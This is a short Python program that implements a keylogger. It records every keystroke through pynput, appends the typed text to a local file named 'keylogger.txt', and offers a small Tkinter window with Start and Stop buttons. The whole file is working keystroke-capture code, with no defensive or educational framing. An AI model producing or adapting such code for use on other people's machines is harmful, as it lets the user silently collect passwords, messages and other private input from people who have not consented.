from pynput import keyboard
from pynput.keyboard import Key, Listener
from tkinter import Tk, Label, Button

keys = []
listener = None

def on_press(key):
    global keys
    keys.append(key)
    write_file(keys)
    keys = []

def on_release(key):
    if key == Key.esc:
        return False

def write_file(keys):
    with open("keylogger.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if "space" in k and "backspace" not in k:
                f.write("\n")
            elif "Key" not in k:
                f.write(k)

def start_keylogger():
    global listener
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    label.config(text="[+] Keylogger is running!\n[!] Saving the keys in 'keylogger.txt'")
    start_button.config(state='disabled')
    stop_button.config(state='normal')

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')

root = Tk()
root.title("Keylogger")

label = Label(root, text="Click Start to begin keylogging.")
label.pack()

start_button = Button(root, text="Start", command=start_keylogger)
start_button.pack()

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')
stop_button.pack()

root.geometry("300x100")
root.mainloop()
